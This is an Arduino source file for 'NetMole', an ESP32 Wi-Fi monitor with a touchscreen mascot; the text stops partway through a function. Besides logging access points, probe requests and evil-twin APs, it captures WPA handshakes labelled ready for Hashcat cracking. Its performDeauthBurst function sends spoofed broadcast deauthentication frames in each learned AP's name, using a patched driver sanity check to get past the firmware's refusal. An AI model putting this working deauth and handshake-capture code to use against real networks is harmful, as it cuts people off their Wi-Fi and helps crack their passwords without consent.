/*
  NetMole v1.0.0 — Wi-Fi Monitor & Deauth Tool
  Device:  ESP32-2432S028R (CYD) MicroUSB
  Display: 320x240 TFT via TFT_eSPI

  === Arduino IDE Settings ===
  Board:     Lolin D32
  Partition: Default
  Freq:      80MHz
  Core:      ESP32 Arduino 2.0.10
  ============================

  Features:
  - Sweeps channels 1-13, learns APs from beacon frames
  - Separate PCAP files per AP: SSID_BSSID_beacon.pcap and SSID_BSSID_eapol.pcap
  - EAPOL (WPA/WPA2 4-way handshake) capture — Hashcat-ready, toggle in config.h
  - Probe request logging to probes.txt (MAC, SSID, channel, RSSI)
  - Suspicious/evil-twin AP detection logged to suspicious.txt
  - Sticky dwell on active channels when interesting traffic is detected
  - Resting mode after configurable inactivity — slow background sweep continues
  - Periodic deauth burst (Dirty Diggler) targeting learned APs — disabled by default
  - Boot splash screen with configurable display duration
  - Animated mole mascot (Diggler) reflects current state:
      Green forward = Idle/Resting
      Left/Right    = Scanning
      Red forward   = Alert (packet logged or suspicious AP detected)
      Orange        = Deauth burst in progress
  - Info panel shows State, AP count, Mode, SD status, and TX count
  - Footer shows most active AP and its live packet count

  States: IDLE, SCANNING, ALERT, DEAUTH
  Modes:  Crawling (sweep), Digging (sticky dwell), Blasting (deauth)

  Notes:
  - Place all sprite .h files in the same sketch folder as NetMole.ino
  - Adjust SD_CS_PIN if your CYD board uses a different CS pin
  - All tunable settings are in config.h
*/

#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_timer.h>
#include <TFT_eSPI.h>
#include <SPI.h>
#include <SD.h>
#include <FS.h>
#include <ctype.h>


#include "netmole-splash.h"
#include "mole_left.h"
#include "mole_right.h"
#include "mole_forward_green.h"
#include "mole_forward_red.h"
#include "mole_deauth_orange.h"

// ============================================================
// Sprite/Mole (Diggler) size
// ============================================================
#define MOLE_W 96
#define MOLE_H 96

// ============================================================
// Display
// ============================================================
TFT_eSPI tft = TFT_eSPI();

// ============================================================
// Screen / panel layout
// ============================================================
static const int SCREEN_W = 320;
static const int SCREEN_H = 240;
static const int TOP_BAR_H = 22;

static const int MOLE_PANEL_X = 8;
static const int MOLE_PANEL_Y = 36;
static const int MOLE_PANEL_W = 170;
static const int MOLE_PANEL_H = 188;

static const int INFO_PANEL_X = 186;
static const int INFO_PANEL_Y = 36;
static const int INFO_PANEL_W = 126;
static const int INFO_PANEL_H = 188;

// Mole sprite position inside the mole panel
static const int MOLE_X = MOLE_PANEL_X + 40;
static const int MOLE_Y = MOLE_PANEL_Y + 42;

#include "config.h"

// ============================================================
// Debug counters
// ============================================================
volatile uint32_t g_rxCount   = 0;
volatile uint32_t g_mgmtCount = 0;
volatile uint32_t g_dataCount = 0;
uint32_t          g_deauthTx  = 0;  // Total deauth packets injected

// ============================================================
// Sprite brightening buffer
// ============================================================
uint16_t spriteBuffer[MOLE_W * MOLE_H];

// ============================================================
// Scanner / mole state
// ============================================================
enum MoleFrame {
  MOLE_LEFT = 0,
  MOLE_RIGHT,
  MOLE_FORWARD_GREEN,
  MOLE_FORWARD_RED,
  MOLE_DEAUTH_ORANGE
};

enum ScannerState {
  STATE_IDLE = 0,
  STATE_SCANNING,
  STATE_ALERT,
  STATE_DEAUTH
};

ScannerState scannerState = STATE_IDLE;
MoleFrame currentFrame = MOLE_FORWARD_GREEN;
MoleFrame lastDrawnFrame = MOLE_FORWARD_RED; // force first draw

// ============================================================
// Timing
// ============================================================
unsigned long lastAnimMs = 0;
unsigned long lastUiMs = 0;
unsigned long lastChannelHopMs = 0;
unsigned long stickyChannelUntilMs = 0;
unsigned long alertStartMs = 0;
unsigned long lastAlertMs = 0;
unsigned long lastInterestingActivityMs = 0;
unsigned long idleEnteredMs = 0;
unsigned long lastDeauthMs = 0;  // Tracks when the last deauth burst fired

// ============================================================
// Channel state
// ============================================================
uint8_t currentChannel = FIRST_CHANNEL;
bool stickyChannelActive = false;
bool scanFlip = false;

// ============================================================
// SD / PCAP
// ============================================================
static const char* PCAP_DIR        = "/pcap";
static const char* PROBE_FILE      = "/probes.txt";
static const char* SUSPICIOUS_FILE = "/suspicious.txt";
bool sdReady = false;

// ============================================================
// AP cache
// ============================================================
struct APRecord {
  bool used;
  uint8_t bssid[6];
  char ssid[33];
  uint8_t ssidLen;
  uint8_t channel;
  bool fileCreated;
  char filePath[96];      // Beacon PCAP: SSID_BSSID_beacon.pcap
  char eapolFilePath[96]; // EAPOL PCAP:  SSID_BSSID_eapol.pcap
  uint32_t packetCount;
};

APRecord apCache[MAX_APS];
int apCount = 0;

// ============================================================
// Pending packet staging
// ============================================================
volatile bool packetPending = false;
volatile uint16_t pendingLen = 0;
volatile uint32_t pendingTsSec = 0;
volatile uint32_t pendingTsUsec = 0;
volatile wifi_promiscuous_pkt_type_t pendingType = WIFI_PKT_MISC;
volatile uint8_t pendingChannel = FIRST_CHANNEL;
volatile int8_t pendingRSSI = 0;
volatile bool wakeFromIdleRequested = false;

uint8_t pendingPacket[MAX_PACKET_LEN];

// ============================================================
// PCAP headers
// ============================================================
struct PcapGlobalHeader {
  uint32_t magic_number;
  uint16_t version_major;
  uint16_t version_minor;
  int32_t  thiszone;
  uint32_t sigfigs;
  uint32_t snaplen;
  uint32_t network;
};

struct PcapPacketHeader {
  uint32_t ts_sec;
  uint32_t ts_usec;
  uint32_t incl_len;
  uint32_t orig_len;
};

// ============================================================
// 802.11 helpers
// ============================================================
#define TYPE_MANAGEMENT  0x00
#define SUBTYPE_BEACONS  0x08
#define SUBTYPE_PROBE_REQ 0x04

// ============================================================
// Helper functions
// ============================================================
const char* stateToString(ScannerState s) {
  switch (s) {
    case STATE_IDLE:     return "SNIFFING";
    case STATE_SCANNING: return "LOCATING";
    case STATE_ALERT:    return "LOGGED";
    case STATE_DEAUTH:   return "DEAUTH";
    default:             return "?";
  }
}

uint16_t brighten565(uint16_t c, float factor) {
  uint8_t r = (c >> 11) & 0x1F;
  uint8_t g = (c >> 5)  & 0x3F;
  uint8_t b =  c        & 0x1F;

  r = min(31, (int)(r * factor));
  g = min(63, (int)(g * factor));
  b = min(31, (int)(b * factor));

  return (r << 11) | (g << 5) | b;
}

void pushBrightSprite(int x, int y, const uint16_t* src, float factor) {
  for (int i = 0; i < MOLE_W * MOLE_H; i++) {
    uint16_t px = pgm_read_word(&src[i]);
    spriteBuffer[i] = brighten565(px, factor);
  }
  tft.pushImage(x, y, MOLE_W, MOLE_H, spriteBuffer);
}

void macToString(const uint8_t* mac, char* out, size_t outSize) {
  snprintf(out, outSize, "%02X%02X%02X%02X%02X%02X",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

// ============================================================
// Footer SSID helpers
// ============================================================
const APRecord* getLastLearnedAP() {
  for (int i = MAX_APS - 1; i >= 0; i--) {
    if (apCache[i].used) {
      return &apCache[i];
    }
  }
  return nullptr;
}

const APRecord* getMostActiveAP() {
  const APRecord* best = nullptr;
  for (int i = 0; i < MAX_APS; i++) {
    if (!apCache[i].used) continue;
    if (!best || apCache[i].packetCount > best->packetCount) {
      best = &apCache[i];
    }
  }
  return best;
}

void buildFooterSSIDText(char* out, size_t outSize) {
  const APRecord* active = getMostActiveAP();
  if (!active) {
    strncpy(out, "Last AP: None", outSize);
    out[outSize - 1] = 0;
    return;
  }

  const char* ssidText = (active->ssidLen == 0 || active->ssid[0] == 0) ? "<hidden>" : active->ssid;
  snprintf(out, outSize, "Top: %s (%lu pkts)", ssidText, active->packetCount);
  out[outSize - 1] = 0;
}

void sanitizeSSID(const char* in, char* out, size_t outSize) {
  size_t j = 0;
  for (size_t i = 0; in[i] != 0 && j + 1 < outSize; i++) {
    char c = in[i];
    if (isalnum((unsigned char)c) || c == '_' || c == '-') {
      out[j++] = c;
    } else if (c == ' ') {
      out[j++] = '_';
    }
  }

  if (j == 0) {
    const char* fallback = "hidden";
    strncpy(out, fallback, outSize);
    out[outSize - 1] = 0;
  } else {
    out[j] = 0;
  }
}

void buildAPFilePath(const char* ssid, const uint8_t* bssid, const char* suffix, char* out, size_t outSize) {
  char cleanSSID[40];
  char macBuf[20];
  sanitizeSSID(ssid, cleanSSID, sizeof(cleanSSID));
  macToString(bssid, macBuf, sizeof(macBuf));
  snprintf(out, outSize, "%s/%s_%s_%s.pcap", PCAP_DIR, cleanSSID, macBuf, suffix);
}

int findAPByBSSID(const uint8_t* bssid) {
  for (int i = 0; i < MAX_APS; i++) {
    if (apCache[i].used && memcmp(apCache[i].bssid, bssid, 6) == 0) {
      return i;
    }
  }
  return -1;
}

int createAPRecord(const uint8_t* bssid, const char* ssid, uint8_t ssidLen, uint8_t channel) {
  for (int i = 0; i < MAX_APS; i++) {
    if (!apCache[i].used) {
      apCache[i].used = true;
      memcpy(apCache[i].bssid, bssid, 6);
      strncpy(apCache[i].ssid, ssid, sizeof(apCache[i].ssid) - 1);
      apCache[i].ssid[sizeof(apCache[i].ssid) - 1] = 0;
      apCache[i].ssidLen = ssidLen;
      apCache[i].channel = channel;
      apCache[i].fileCreated = false;
      apCache[i].filePath[0] = 0;
      apCache[i].eapolFilePath[0] = 0;
      buildAPFilePath(apCache[i].ssid, apCache[i].bssid, "beacon", apCache[i].filePath, sizeof(apCache[i].filePath));
      buildAPFilePath(apCache[i].ssid, apCache[i].bssid, "eapol",  apCache[i].eapolFilePath, sizeof(apCache[i].eapolFilePath));
      apCount++;
      return i;
    }
  }
  return -1;
}

bool ensurePcapDir() {
  if (!SD.exists(PCAP_DIR)) {
    return SD.mkdir(PCAP_DIR);
  }
  return true;
}

void writePcapGlobalHeader(File &f) {
  PcapGlobalHeader gh;
  gh.magic_number  = 0xa1b2c3d4;
  gh.version_major = 2;
  gh.version_minor = 4;
  gh.thiszone      = 0;
  gh.sigfigs       = 0;
  gh.snaplen       = MAX_PACKET_LEN;
  gh.network       = 105; // LINKTYPE_IEEE802_11

  f.write((uint8_t*)&gh, sizeof(gh));
  f.flush();
}

bool appendPacketToFile(const char* path, uint32_t tsSec, uint32_t tsUsec, const uint8_t* data, uint32_t len) {
  if (!sdReady) return false;

  File f;
  bool exists = SD.exists(path);
  f = SD.open(path, FILE_APPEND);
  if (!f) return false;

  if (!exists || f.size() == 0) {
    writePcapGlobalHeader(f);
  }

  PcapPacketHeader ph;
  ph.ts_sec   = tsSec;
  ph.ts_usec  = tsUsec;
  ph.incl_len = len;
  ph.orig_len = len;

  f.write((uint8_t*)&ph, sizeof(ph));
  f.write(data, len);
  f.flush();
  f.close();

  return true;
}

bool initSDCard() {
  if (!SD.begin(SD_CS_PIN)) {
    Serial.println("SD.begin failed");
    return false;
  }

  if (!ensurePcapDir()) {
    Serial.println("Failed to create /pcap directory");
    return false;
  }

  // Write CSV header to probes.txt if it doesn't exist yet
  if (PROBE_LOGGING_ENABLED && !SD.exists(PROBE_FILE)) {
    File f = SD.open(PROBE_FILE, FILE_WRITE);
    if (f) {
      f.println("MAC, SSID, Channel, RSSI");
      f.flush();
      f.close();
      Serial.println("Created probes.txt");
    }
  }

  // Write CSV header to suspicious.txt if it doesn't exist yet
  if (SUSPICIOUS_DETECTION_ENABLED && !SD.exists(SUSPICIOUS_FILE)) {
    File f = SD.open(SUSPICIOUS_FILE, FILE_WRITE);
    if (f) {
      f.println("Reason, SSID, BSSID, Channel, RSSI");
      f.flush();
      f.close();
      Serial.println("Created suspicious.txt");
    }
  }

  Serial.println("SD ready");
  return true;
}

void setWiFiChannel(uint8_t ch) {
  if (ch < FIRST_CHANNEL) ch = FIRST_CHANNEL;
  if (ch > LAST_CHANNEL) ch = LAST_CHANNEL;

  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  currentChannel = ch;
}

void engageStickyDwell(uint8_t channel) {
  setWiFiChannel(channel);
  stickyChannelActive = true;
  stickyChannelUntilMs = millis() + STICKY_DWELL_MS;  // Adjust sticky dwell time above
}

void updateChannelDwell() {
  unsigned long now = millis();

  if (stickyChannelActive) {
    if (now >= stickyChannelUntilMs) {
      stickyChannelActive = false;
      lastChannelHopMs = now;
      Serial.println("Sticky dwell expired, returning to sweep mode");
    }
    return;
  }

  // Resting still performs a slow lazy sweep so NetMole can notice new activity
  // on other channels without looking fully awake on screen.
  unsigned long hopIntervalMs = (scannerState == STATE_IDLE) ? REST_SWEEP_HOP_MS : SWEEP_HOP_MS;

  if (now - lastChannelHopMs < hopIntervalMs) return;
  lastChannelHopMs = now;

  uint8_t nextCh = currentChannel + 1;
  if (nextCh > LAST_CHANNEL) nextCh = FIRST_CHANNEL;
  setWiFiChannel(nextCh);
}

void setScannerState(ScannerState newState) {
  if (scannerState != newState) {
    scannerState = newState;
  }
}

void markInterestingActivity() {
  lastInterestingActivityMs = millis();
}

void enterIdleBurrow() {
  stickyChannelActive = false;
  idleEnteredMs = millis();
  lastChannelHopMs = millis();
  setScannerState(STATE_IDLE);
  currentFrame = MOLE_FORWARD_GREEN;
}

void wakeFromIdleBurrow() {
  lastChannelHopMs = millis();
  markInterestingActivity();
  setScannerState(STATE_SCANNING);
}

void updateIdleBurrowState() {
  unsigned long now = millis();

  // While Resting, NetMole still performs a slow sweep underneath.
  // It only wakes back into Dig Mode when interesting activity is found.
  if (scannerState == STATE_IDLE) {
    return;
  }

  // Do not fall asleep while a sticky dwell or alert is active.
  if (stickyChannelActive || scannerState == STATE_ALERT || scannerState == STATE_DEAUTH) {
    return;
  }

  if (now - lastInterestingActivityMs >= REST_AFTER_QUIET_MS) {
    enterIdleBurrow();
  }
}

void triggerAlert() {
  if (millis() - lastAlertMs < ALERT_COOLDOWN_MS) return; // Adjust cooldown above
  scannerState = STATE_ALERT;
  currentFrame = MOLE_FORWARD_RED;
  alertStartMs = millis();
  lastAlertMs = millis();
}

// ============================================================
// Drawing
// ============================================================
void drawLayout() {
  tft.fillScreen(TFT_BLACK);

  tft.fillRect(0, 0, SCREEN_W, TOP_BAR_H, TFT_BLACK);
  tft.drawFastHLine(0, TOP_BAR_H, SCREEN_W, TFT_DARKGREY);

  tft.drawRect(MOLE_PANEL_X, MOLE_PANEL_Y, MOLE_PANEL_W, MOLE_PANEL_H, TFT_DARKGREY);
  tft.drawRect(INFO_PANEL_X, INFO_PANEL_Y, INFO_PANEL_W, INFO_PANEL_H, TFT_DARKGREY);

  tft.drawFastHLine(INFO_PANEL_X + 4, INFO_PANEL_Y + 44, INFO_PANEL_W - 8, TFT_DARKGREY);
  tft.drawFastHLine(INFO_PANEL_X + 4, INFO_PANEL_Y + 88, INFO_PANEL_W - 8, TFT_DARKGREY);
  tft.drawFastHLine(INFO_PANEL_X + 4, INFO_PANEL_Y + 132, INFO_PANEL_W - 8, TFT_DARKGREY);

  tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
  tft.setTextSize(1);
  tft.setCursor(MOLE_PANEL_X + 2, MOLE_PANEL_Y - 10);
  tft.print("Diggler");
  tft.setCursor(INFO_PANEL_X + 2, INFO_PANEL_Y - 10);
  tft.print("INFO");

  // Footer guide line for the last learned SSID readout
  tft.drawFastHLine(0, 224, SCREEN_W, TFT_DARKGREY);
}

// ============================================================
// Mole
// ============================================================
void drawMole(MoleFrame frame) {
  const uint16_t* img = mole_forward_green;

  switch (frame) {
    case MOLE_LEFT:          img = mole_left; break;
    case MOLE_RIGHT:         img = mole_right; break;
    case MOLE_FORWARD_GREEN:   img = mole_forward_green; break;
    case MOLE_FORWARD_RED:     img = mole_forward_red; break;
    case MOLE_DEAUTH_ORANGE:   img = mole_deauth_orange; break;
  }

  tft.fillRect(MOLE_X, MOLE_Y, MOLE_W, MOLE_H, TFT_BLACK);
  pushBrightSprite(MOLE_X, MOLE_Y, img, SPRITE_BRIGHTNESS);
  lastDrawnFrame = frame;
}

// ============================================================
// Header Bar
// ============================================================
void drawHeader() {
  uint16_t dirtBrown = tft.color565(139, 69, 19); // R, G, B (0-255)
  tft.fillRect(0, 0, SCREEN_W, TOP_BAR_H, dirtBrown);

  tft.setTextColor(TFT_GREEN, dirtBrown);
  tft.setTextSize(2);
  tft.setCursor(4, 4);
  tft.print("NetMole v1");

  tft.setTextColor(TFT_WHITE, dirtBrown);
  tft.setTextSize(2);
  tft.setCursor(248, 4);
  tft.printf("Ch:%d", currentChannel);
}

void drawStatus() {
  tft.fillRect(INFO_PANEL_X + 6, INFO_PANEL_Y + 6, INFO_PANEL_W - 12, 32, TFT_BLACK);

  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(2);
  tft.setCursor(INFO_PANEL_X + 8, INFO_PANEL_Y + 6);
  tft.print("State");

  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.setCursor(INFO_PANEL_X + 8, INFO_PANEL_Y + 24);
  tft.print(stateToString(scannerState));
}

void drawInfo() {
  // AP count
  tft.fillRect(INFO_PANEL_X + 6, INFO_PANEL_Y + 50, INFO_PANEL_W - 12, 30, TFT_BLACK);
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.setTextSize(2);
  tft.setCursor(INFO_PANEL_X + 8, INFO_PANEL_Y + 58);
  tft.printf("APs: %d", apCount);

  // Mode
  tft.fillRect(INFO_PANEL_X + 6, INFO_PANEL_Y + 94, INFO_PANEL_W - 12, 30, TFT_BLACK);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(2);
  tft.setCursor(INFO_PANEL_X + 8, INFO_PANEL_Y + 92);
  tft.print("Mode:");
  if (scannerState == STATE_DEAUTH) {
    tft.setTextColor(TFT_RED, TFT_BLACK);
    tft.setCursor(INFO_PANEL_X + 8, INFO_PANEL_Y + 112);
    tft.print("Blasting");
  } else {
    tft.setTextColor(TFT_VIOLET, TFT_BLACK);
    tft.setTextSize(2);
    tft.setCursor(INFO_PANEL_X + 8, INFO_PANEL_Y + 112);
    tft.print(stickyChannelActive ? "Digging " : "Crawling");
  }

  // SD status
  tft.fillRect(INFO_PANEL_X + 6, INFO_PANEL_Y + 138, INFO_PANEL_W - 12, 40, TFT_BLACK);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(2);
  tft.setCursor(INFO_PANEL_X + 8, INFO_PANEL_Y + 138);
  tft.print("SD:");

  tft.setTextColor(sdReady ? TFT_GREEN : TFT_RED, TFT_BLACK);
  tft.setCursor(INFO_PANEL_X + 44, INFO_PANEL_Y + 138);
  tft.print(sdReady ? "Ready" : "Fail");

  // Deauth TX counter (replaces raw RX debug line)
  tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
  tft.setTextSize(1);
  tft.setCursor(INFO_PANEL_X + 8, INFO_PANEL_Y + 158);
  tft.printf("TX:%lu", g_deauthTx);
}

void drawFooterSSID() {
  char footerText[64];
  buildFooterSSIDText(footerText, sizeof(footerText));

  tft.fillRect(0, 226, SCREEN_W, 14, TFT_BLACK);
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.setTextSize(1);
  tft.setCursor(4, 230);
  tft.print(footerText);
}

void fullRedraw() {
  drawLayout();
  drawHeader();
  drawStatus();
  drawMole(currentFrame);
  drawInfo();
  drawFooterSSID();
}

// ============================================================
// Mole animation
// ============================================================
void updateMoleAnimation() {
  unsigned long now = millis();

  // Hold orange deauth sprite while blasting
  if (scannerState == STATE_DEAUTH) {
    currentFrame = MOLE_DEAUTH_ORANGE;
    return;
  }

  if (scannerState == STATE_ALERT) {
    currentFrame = MOLE_FORWARD_RED;
    if (now - alertStartMs >= ALERT_DURATION_MS) {  // Adjust alert duration above
      scannerState = STATE_SCANNING;
      currentFrame = MOLE_FORWARD_GREEN;
    }
    return;
  }

  if (now - lastAnimMs < ANIM_INTERVAL_MS) return;  // Adjust animation speed above
  lastAnimMs = now;

  switch (scannerState) {
    case STATE_IDLE:
      currentFrame = MOLE_FORWARD_GREEN;
      break;

    case STATE_SCANNING:
      scanFlip = !scanFlip;
      currentFrame = scanFlip ? MOLE_LEFT : MOLE_RIGHT;
      break;

    default:
      currentFrame = MOLE_FORWARD_GREEN;
      break;
  }
}

// ============================================================
// Packet classification helpers
// ============================================================
bool isEAPOLPacket(const uint8_t* payload, uint16_t len) {
  if (len < 34) return false;

  if ((payload[30] == 0x88 && payload[31] == 0x8e) ||
      (payload[32] == 0x88 && payload[33] == 0x8e)) {
    return true;
  }
  return false;
}

bool parseBeacon(const uint8_t* payload, uint16_t len, uint8_t* outBSSID, char* outSSID, uint8_t* outSSIDLen) {
  if (len < 40) return false;

  unsigned int frameControl = ((unsigned int)payload[1] << 8) + payload[0];
  uint8_t version      = (frameControl & 0b0000000000000011) >> 0;
  uint8_t frameType    = (frameControl & 0b0000000000001100) >> 2;
  uint8_t frameSubType = (frameControl & 0b0000000011110000) >> 4;

  if (!(frameType == TYPE_MANAGEMENT && frameSubType == SUBTYPE_BEACONS && version == 0)) {
    return false;
  }

  uint8_t ssidLen = payload[37];
  if (ssidLen > 32) return false;
  if ((38 + ssidLen) > len) return false;

  bool asciiError = false;
  for (uint8_t i = 0; i < ssidLen; i++) {
    if (!isprint(payload[38 + i]) || !isascii(payload[38 + i])) {
      asciiError = true;
      break;
    }
  }
  if (asciiError) return false;

  memcpy(outBSSID, payload + 16, 6);
  memcpy(outSSID, payload + 38, ssidLen);
  outSSID[ssidLen] = 0;
  *outSSIDLen = ssidLen;
  return true;
}

// ============================================================
// Promiscuous callback
// ============================================================
void sniffer_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type == WIFI_PKT_MISC) return;
  if (packetPending) return;

  g_rxCount++;
  if (type == WIFI_PKT_MGMT) g_mgmtCount++;
  if (type == WIFI_PKT_DATA) g_dataCount++;

  const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
  const wifi_pkt_rx_ctrl_t ctrl = pkt->rx_ctrl;

  int rawLen = ctrl.sig_len;
  if (type == WIFI_PKT_MGMT) rawLen -= 4;
  if (rawLen <= 0) return;

  uint16_t copyLen = (rawLen > MAX_PACKET_LEN) ? MAX_PACKET_LEN : rawLen;

  memcpy((void*)pendingPacket, pkt->payload, copyLen);

  int64_t t = esp_timer_get_time();
  pendingTsSec   = (uint32_t)(t / 1000000ULL);
  pendingTsUsec  = (uint32_t)(t % 1000000ULL);
  pendingLen     = copyLen;
  pendingType    = type;
  pendingChannel = currentChannel;
  pendingRSSI    = (int8_t)ctrl.rssi;
  packetPending  = true;
}

// ============================================================
// Deauth burst injection
// ============================================================

// Override the WiFi driver's internal frame sanity check.
// Without this esp_wifi_80211_tx rejects management frames (0xC0) with
// "unsupport frame type" on core 2.0.x. Marauder uses this same bypass.
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  if (arg == 31337) return 1;
  return 0;
}

/*
 * Sends DEAUTH_BURST_COUNT deauth frames to each known AP (broadcast dest),
 * spoofing the AP's BSSID as the source so clients believe the AP sent them.
 *
 * Safe pattern for promiscuous + tx:
 *   1. Disable promiscuous  (avoids esp_wifi mutex deadlock)
 *   2. Hop to AP's channel
 *   3. Inject burst
 *   4. Move on to next AP
 *   5. Restore currentChannel + re-enable promiscuous
 */
void performDeauthBurst() {
  if (apCount == 0) return;

  // Save current state and switch to DEAUTH
  ScannerState prevState = scannerState;
  setScannerState(STATE_DEAUTH);

  // Force the display to show DEAUTH/Blasting NOW before blocking work begins.
  // Without this the main loop never gets a chance to refresh during the burst.
  currentFrame = MOLE_DEAUTH_ORANGE;
  drawMole(currentFrame);
  drawHeader();
  drawStatus();
  drawInfo();

  // --- Build deauth frame template ---
  // Deauth frame layout matching Marauder's deauth_frame_default exactly
  uint8_t frame[26];
  memset(frame, 0, sizeof(frame));
  frame[0]  = 0xC0;              // Frame Control: type=mgmt, subtype=deauth
  frame[1]  = 0x00;
  frame[2]  = 0x3a;              // Duration (matches Marauder)
  frame[3]  = 0x01;
  memset(frame + 4, 0xFF, 6);    // DA: broadcast FF:FF:FF:FF:FF:FF
  // frame[10..15] = SA    — filled per AP below
  // frame[16..21] = BSSID — filled per AP below
  frame[22] = 0xf0;              // Sequence control (matches Marauder)
  frame[23] = 0xff;
  frame[24] = 0x02;              // Reason code 2: prev auth no longer valid
  frame[25] = 0x00;

  // Pause sniffer before injecting to prevent WiFi driver mutex deadlock
  esp_wifi_set_promiscuous(false);
  delay(15);

  int burstTotal = 0;

  for (int i = 0; i < MAX_APS; i++) {
    if (!apCache[i].used) continue;

    // Skip APs that haven't hit the minimum activity threshold
    if (apCache[i].packetCount < DEAUTH_MIN_PACKETS) {
      Serial.printf("Skipping %s  (pkts:%lu < min:%lu)\n",
                    apCache[i].ssid, apCache[i].packetCount, DEAUTH_MIN_PACKETS);
      continue;
    }

    // Fill SA and BSSID with the AP's BSSID (frames appear to come from the AP)
    memcpy(frame + 10, apCache[i].bssid, 6);
    memcpy(frame + 16, apCache[i].bssid, 6);

    // Hop to the AP's channel
    esp_wifi_set_channel(apCache[i].channel, WIFI_SECOND_CHAN_NONE);
    delay(5);

    for (int j = 0; j < DEAUTH_BURST_COUNT; j++) {
      esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
      Serial.printf("  tx[%d] err=0x%x\n", j, err);
      delay(2);
    }

    burstTotal += DEAUTH_BURST_COUNT;
    Serial.printf("Deauth burst → %s  ch%d  pkts:%lu  x%d\n",
                  apCache[i].ssid, apCache[i].channel,
                  apCache[i].packetCount, DEAUTH_BURST_COUNT);
  }

  // Restore the channel we were scanning on and re-enable sniffer
  esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
  delay(10);
  esp_wifi_set_promiscuous(true);
  delay(10);

  g_deauthTx += burstTotal;

  // Restore previous state then flash alert
  setScannerState(prevState);
  triggerAlert();
}

void updateDeauthSchedule() {
  if (!DEAUTH_ENABLED) return;
  if (apCount == 0) return;

  unsigned long now = millis();
  if (now - lastDeauthMs < DEAUTH_INTERVAL_MS) return;
  lastDeauthMs = now;

  performDeauthBurst();
}

// ============================================================
// Sniffer init
// ============================================================
void initSniffer() {
  // APSTA + softAP required so WIFI_IF_AP is available for esp_wifi_80211_tx
  WiFi.mode(WIFI_MODE_APSTA);
  WiFi.softAP("netmole", "netmole1", currentChannel, 1); // hidden AP, interface must be up for tx
  WiFi.disconnect(false, true);
  WiFi.setSleep(false);
  delay(200);

  esp_wifi_set_promiscuous(false);
  delay(20);
  esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
  delay(20);
  esp_wifi_set_promiscuous_rx_cb(&sniffer_cb);
  delay(20);
  esp_wifi_set_promiscuous(true);
  delay(20);

  setScannerState(STATE_SCANNING);
  markInterestingActivity();
  lastChannelHopMs = millis();
  Serial.println("Promiscuous sniffer started");
}

// ============================================================
// Suspicious AP detection
// ============================================================
bool isSuspiciousSSID(const char* ssid) {
  for (int i = 0; i < SUSPICIOUS_SSID_COUNT; i++) {
    if (strcasecmp(ssid, SUSPICIOUS_SSIDS[i]) == 0) return true;
  }
  return false;
}

// Returns index of existing AP with same SSID but different BSSID, or -1
int findEvilTwin(const char* ssid, const uint8_t* bssid) {
  for (int i = 0; i < MAX_APS; i++) {
    if (!apCache[i].used) continue;
    if (memcmp(apCache[i].bssid, bssid, 6) == 0) continue; // same AP
    if (strcasecmp(apCache[i].ssid, ssid) == 0) return i;  // same SSID, different BSSID
  }
  return -1;
}

void logSuspiciousAP(const char* reason, const char* ssid, const uint8_t* bssid, uint8_t channel, int8_t rssi) {
  char macBuf[20];
  macToString(bssid, macBuf, sizeof(macBuf));
  Serial.printf("SUSPICIOUS [%s]: SSID=\"%s\" BSSID=%s ch%d %ddBm\n",
                reason, ssid, macBuf, channel, rssi);

  if (!sdReady) return;
  File f = SD.open(SUSPICIOUS_FILE, FILE_APPEND);
  if (!f) return;
  f.printf("%s, %s, %s, ch%d, %ddBm\n", reason, ssid, macBuf, channel, rssi);
  f.flush();
  f.close();
}

// ============================================================
// Probe request helpers
// ============================================================
bool parseProbe(const uint8_t* payload, uint16_t len, uint8_t* outMAC, char* outSSID, uint8_t* outSSIDLen) {
  if (len < 24) return false;

  unsigned int frameControl = ((unsigned int)payload[1] << 8) + payload[0];
  uint8_t frameType    = (frameControl & 0b0000000000001100) >> 2;
  uint8_t frameSubType = (frameControl & 0b0000000011110000) >> 4;
  uint8_t version      = (frameControl & 0b0000000000000011);

  if (!(frameType == TYPE_MANAGEMENT && frameSubType == SUBTYPE_PROBE_REQ && version == 0)) {
    return false;
  }

  // SA (source MAC) is at bytes 10-15
  memcpy(outMAC, payload + 10, 6);

  // SSID element starts at byte 24: tag=0x00, length, then SSID bytes
  if (len < 26) {
    *outSSIDLen = 0;
    outSSID[0] = 0;
    return true; // wildcard probe, valid but empty
  }

  uint8_t ssidLen = payload[25];
  if (ssidLen > 32 || (26 + ssidLen) > len) {
    *outSSIDLen = 0;
    outSSID[0] = 0;
    return true; // treat as wildcard
  }

  memcpy(outSSID, payload + 26, ssidLen);
  outSSID[ssidLen] = 0;
  *outSSIDLen = ssidLen;
  return true;
}

void logProbeToFile(const uint8_t* mac, const char* ssid, uint8_t ssidLen, uint8_t channel, int8_t rssi) {
  if (!sdReady) return;

  File f = SD.open(PROBE_FILE, FILE_APPEND);
  if (!f) return;

  char macBuf[20];
  macToString(mac, macBuf, sizeof(macBuf));

  const char* ssidText = (ssidLen == 0 || ssid[0] == 0) ? "[wildcard]" : ssid;
  f.printf("%s, %s, ch%d, %ddBm\n", macBuf, ssidText, channel, rssi);
  f.flush();
  f.close();
}

// ============================================================
// Process packet in main loop
// ============================================================
void processPendingPacket() {
  if (!packetPending) return;

  static uint8_t localBuf[MAX_PACKET_LEN];
  uint32_t tsSec;
  uint32_t tsUsec;
  uint16_t len;
  wifi_promiscuous_pkt_type_t pktType;
  uint8_t pktChannel;
  int8_t pktRSSI;

  noInterrupts();
  tsSec      = pendingTsSec;
